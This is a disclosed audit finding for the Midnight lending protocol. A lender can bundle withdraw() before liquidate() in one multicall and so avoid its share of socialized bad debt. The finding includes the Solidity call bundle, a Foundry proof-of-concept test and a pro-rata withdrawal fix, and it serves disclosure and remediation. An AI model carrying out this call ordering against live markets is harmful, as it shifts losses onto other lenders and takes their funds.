# Midnight — M-01

## Severity
Medium

## Category
Accounting / State Transition / Economic Manipulation

## Status
Publicly disclosed

## Summary

A lender can use the protocol's multicall mechanism to withdraw
before bad debt is realized in the same transaction, allowing the
lender to avoid its proportional share of the loss while the
remaining lenders absorb it.

## Security Impact

The issue breaks the protocol's intended proportional bad-debt
socialization invariant.

## Root Cause

The protocol evaluates the lender's position against the current
lossFactor during withdrawal, while liquidation updates lossFactor
only afterward. multicall allows both operations to be executed
atomically in attacker-controlled order.

## Attack Flow

withdraw()
    ↓
position updated using old lossFactor
    ↓
attacker receives withdrawable assets
    ↓
liquidate()
    ↓
lossFactor increases
    ↓
remaining lenders absorb the loss

## [01-M] Lender Can Atomically Escape Bad Debt Socialization Via multicall, Imposing Disproportionate Losses On Remaining Lenders


created on Jun 11, 2026 at 09:17

### Summary
A lender can use the protocol’s `multicall()` function to atomically withdraw their credit before bad debt is realized in the same transaction. Because `withdraw()` calls `_updatePosition()` (which reads the current `lossFactor`) before `liquidate()` updates it, the withdrawing lender fully escapes their share of the loss. The entire bad debt is then socialized onto the remaining lenders. This breaks the protocol’s documented guarantee of proportional bad debt socialization and can be executed by any informed lender in a single transaction with no MEV infrastructure required.

## Finding Description  
**Background**

Midnight socializes bad debt proportionally by updating a market-wide `lossFactor` inside `liquidate()`:
```solidity
if (badDebt > 0) {
    _position.debt -= uint128(badDebt);
    _marketState.lossFactor = UtilsLib.toUint128(
        type(uint128).max - (type(uint128).max - _lossFactor)
            .mulDivDown(_totalUnits - badDebt, _totalUnits)
    );
    _marketState.totalUnits -= UtilsLib.toUint128(badDebt);
}
Each lender’s credit is adjusted proportionally on their next interaction via _updatePosition():

uint256 postSlashCredit = _lastLossFactor < type(uint128).max
    ? credit.mulDivDown(
        type(uint128).max - marketState[id].lossFactor,
        type(uint128).max - _lastLossFactor
      )
    : 0;
```
The protocol’s NatSpec clearly documents this behavior:

```solidity
/// @dev When a borrower's bad debt is realized, it is socialized among lenders in this market.
/// @dev At each lender's next interaction, their credit is slashed proportionally.
```

### Root Cause

The vulnerability is in `withdraw()`, which calls `_updatePosition()` before decrementing credit:
```solidity
function withdraw(...) external {
    _updatePosition(market, id, onBehalf);   // reads lossFactor HERE
    
    _position.credit -= UtilsLib.toUint128(units);  // credit decremented AFTER
    _marketState.withdrawable -= UtilsLib.toUint128(units);
    SafeTransferLib.safeTransfer(market.loanToken, receiver, units);
}
```
If `liquidate()` has not yet been called, lossFactor is unchanged, `_updatePosition()` applies zero slash and the lender exits at full value. Midnight's `multicall()` uses delegatecall, preserving `msg.sender` and executing calls sequentially in the same transaction:
```solidity
function multicall(bytes[] calldata calls) external {
    for (uint256 i = 0; i < calls.length; i++) {
        (bool success, bytes memory returnData) = address(this).delegatecall(calls[i]);
        ...
    }
}
```
This allows any lender to bundle the following atomically:
```solidity
bytes[] memory calls = new bytes[](2);

// Step 1: exit before lossFactor changes
calls[0] = abi.encodeCall(midnight.withdraw, (market, myCredit, msg.sender, msg.sender));

// Step 2: realize bad debt — costs only gas (0,0 is explicitly supported)
// lossFactor updates HERE, after attacker's credit is already zero
calls[1] = abi.encodeCall(midnight.liquidate, (market, collatIndex, 0, 0, defaulter, true, msg.sender, address(0), ""));
midnight.multicall(calls);
```
The protocol explicitly supports zero-cost bad debt realization:
```solidity
/// @dev Passing both 0 for seizedAssets and repaidUnits allows to realize  
/// bad debt with 0 token transferred.
```
The attacker pays only gas for step 2.
The `lossFactor` update in step 2 has no effect on the attacker, their credit is already zero after step 1.

If the attacker holds 50% of market credit, remaining lenders absorb 2× their fair share. At 80%, 5×.
The attacker's avoided loss is transferred in full to whoever cannot exit first.

**Why Conditions Are Reliably Met At Maturity**

The attack requires:

(1) sufficient withdrawable to cover the attacker's credit, and  
(2) a borrower with realizable bad debt.

Both conditions converge predictably at maturity:  
Repaid borrowers fill withdrawable at maturity
All post-maturity positions are liquidatable at `block.timestamp` > maturity (next block)
For volatile collateral markets (`γ=0.5, LLTV=0.60, maxLif=1.25`), large positions become profitable to liquidate within seconds of maturity due to the LIF ramp
Maturity is a known public timestamp — any lender can prepare the bundle in advance
The attack requires no **MEV** infrastructure, no Flashbots, no block builder access. It requires only: a script, knowledge of the market state (all public on-chain), and one transaction.

### Impact Explanation
Violates the protocol’s documented guarantee that bad debt is socialized proportionally among all lenders.  
Remaining lenders absorb 100% of the bad debt (instead of their fair share).  
Loss amplification scales with the attacker’s share of the market (e.g. 2×–5×+ worse for others).  
Particularly harmful in volatile collateral markets at/after maturity, where conditions for the attack naturally align.  
Additional unfairness via partial fee forgiveness for the early exiter.  
### Likelihood Explanation  

The required conditions (sufficient withdrawable + realizable bad debt) arise predictably at maturity and during price crashes, but are not present in every market at all times.  
No special permissions or MEV tools are needed — only public state knowledge and one transaction.

## Proof of Concept
```solidity
// Add directly to a contract inheriting BaseTest, zero modifications required.

function test_multicallEscapesBadDebtSocialization() public {

    CollateralParams[] memory params = new CollateralParams[](1);
    params[0] = CollateralParams({
        token:  address(collateralToken1),
        oracle: address(oracle1),
        lltv:   LLTV_5,
        maxLif: maxLif(LLTV_5, LIQUIDATION_CURSOR_LOW)
    });

    Market memory market = Market({
        loanToken:        address(loanToken),
        collateralParams: params,
        maturity:         block.timestamp + 30 days,
        rcfThreshold:     0,
        enterGate:        address(0),
        liquidatorGate:   address(0)
    });

    oracle1.setPrice(ORACLE_PRICE_SCALE);
    bytes32 id = toId(market);

    uint256 units = 5_000e18;

    // lender lends 5,000: posts buy offer, borrower takes (borrows)
    deal(address(loanToken), lender, units);

    Offer memory lenderOffer;
    lenderOffer.market   = market;
    lenderOffer.buy      = true;
    lenderOffer.maker    = lender;
    lenderOffer.maxUnits = units;
    lenderOffer.group    = keccak256("lenderGroup");
    lenderOffer.ratifier = address(dummyRatifier);
    lenderOffer.start    = block.timestamp;
    lenderOffer.expiry   = block.timestamp + 30 days;
    lenderOffer.tick     = MAX_TICK;

    collateralize(market, borrower, units);
    take(units, borrower, lenderOffer);

    assertEq(midnight.creditOf(id, lender), units, "lender credit");
    assertEq(midnight.debtOf(id, borrower), units, "borrower debt");

    // otherLender lends 5,000: posts buy offer, otherBorrower takes
    deal(address(loanToken), otherLender, units);

    Offer memory otherLenderOffer;
    otherLenderOffer.market   = market;
    otherLenderOffer.buy      = true;
    otherLenderOffer.maker    = otherLender;
    otherLenderOffer.maxUnits = units;
    otherLenderOffer.group    = keccak256("otherLenderGroup");
    otherLenderOffer.ratifier = address(dummyRatifier);
    otherLenderOffer.start    = block.timestamp;
    otherLenderOffer.expiry   = block.timestamp + 30 days;
    otherLenderOffer.tick     = MAX_TICK;

    collateralize(market, otherBorrower, units);
    take(units, otherBorrower, otherLenderOffer);

    assertEq(midnight.creditOf(id, otherLender), units, "otherLender credit");
    assertEq(midnight.debtOf(id, otherBorrower), units, "otherBorrower debt");
    assertEq(midnight.lossFactor(id),            0,     "lossFactor starts 0");

    // Maturity hits: borrower repays (fills withdrawable)
    // otherBorrower does NOT repay (bad debt source)
    vm.warp(market.maturity + 1);

    deal(address(loanToken), borrower, units);
    vm.prank(borrower);
    midnight.repay(market, units, borrower, address(0), hex"");

    assertEq(midnight.withdrawable(id), units, "withdrawable filled by repayment");
    assertEq(midnight.debtOf(id, borrower), 0, "borrower fully repaid");

    // Crash oracle: otherBorrower collateral now worth 25% of original
    // bad debt = debt - (collateralValue / maxLif) > 0
    oracle1.setPrice(ORACLE_PRICE_SCALE / 4);

    // CRITICAL ORDERING FACT:
    // Oracle price crash alone does NOT update lossFactor.
    // lossFactor is only written inside liquidate().
    // withdraw() reading lossFactor BEFORE liquidate() writes it
    // is the root cause. multicall guarantees this ordering atomically.
    assertEq(midnight.lossFactor(id), 0, "oracle crash alone does not update lossFactor");

    // ── THE ATTACK ──
    uint256 lenderBalanceBefore = loanToken.balanceOf(lender);

    bytes[] memory calls = new bytes[](2);
    calls[0] = abi.encodeCall(
        midnight.withdraw,
        (market, units, lender, lender)
    );
    calls[1] = abi.encodeCall(
        midnight.liquidate,
        (market, 0, 0, 0, otherBorrower, true, lender, address(0), hex"")
    );

    vm.prank(lender);
    midnight.multicall(calls);

    // Verify a violation of proportional loss distribution (a core documented guarantee).

    uint256 lenderRecovered = loanToken.balanceOf(lender) - lenderBalanceBefore;

    assertGt(midnight.lossFactor(id), 0,     "lossFactor updated by liquidate in call[1]");
    assertEq(lenderRecovered,  units,  "lender recovered full credit, zero slash applied");
    assertEq(midnight.creditOf(id, lender), 0, "lender credit fully consumed");

    // Materialize otherLender's slash
    midnight.updatePosition(market, otherLender);
    uint256 otherLenderRemaining = midnight.creditOf(id, otherLender);

    // Fair distribution: equal credit → equal bad debt share
    uint256 totalRecovered = lenderRecovered + otherLenderRemaining;
    uint256 fairShareEach  = totalRecovered / 2;

    
    // Lender recovered strictly more than fair share
    assertGt(
        lenderRecovered,
        fairShareEach,
        "INVARIANT VIOLATED: lender escaped disproportionate bad debt via multicall"
    );

    // otherLender bears strictly more than fair share
    assertLt(
        otherLenderRemaining,
        fairShareEach,
        "INVARIANT VIOLATED: otherLender absorbs excess bad debt"
    );

    // Loss transferred is equal and opposite — zero sum redistribution
    assertApproxEqAbs(
        lenderRecovered      - fairShareEach,
        fairShareEach        - otherLenderRemaining,
        1e15,
        "wealth transfer from otherLender to lender is equal and opposite"
    );
}
```
## Recommendation
The root cause is that `withdraw()` has no coordination with outstanding bad debt state, and `multicall()` enables atomic ordering of `withdraw()` before `liquidate()`.  
The cleanest fix is pro-rata withdrawal enforcement, limit each lender to their proportional share of current withdrawable at any given time:
```solidity
function withdraw(Market memory market, uint256 units, address onBehalf, address receiver) external {

    _updatePosition(market, id, onBehalf);

    Position storage _position = position[id][onBehalf];

    // Enforce pro-rata: cap withdrawal to lender's proportional share
    // of current withdrawable, eliminating the ordering advantage.
    uint256 proRataMax = _marketState.withdrawable
        .mulDivDown(_position.credit, _marketState.totalUnits);
    require(units <= proRataMax, ExceedsProRataWithdrawable());

}
```
This makes the ordering of `withdraw()` relative to `liquidate()` irrelevant to loss distribution, each lender can only access their proportional slice of withdrawable at any time, so atomically front-running bad debt realization provides no advantage.
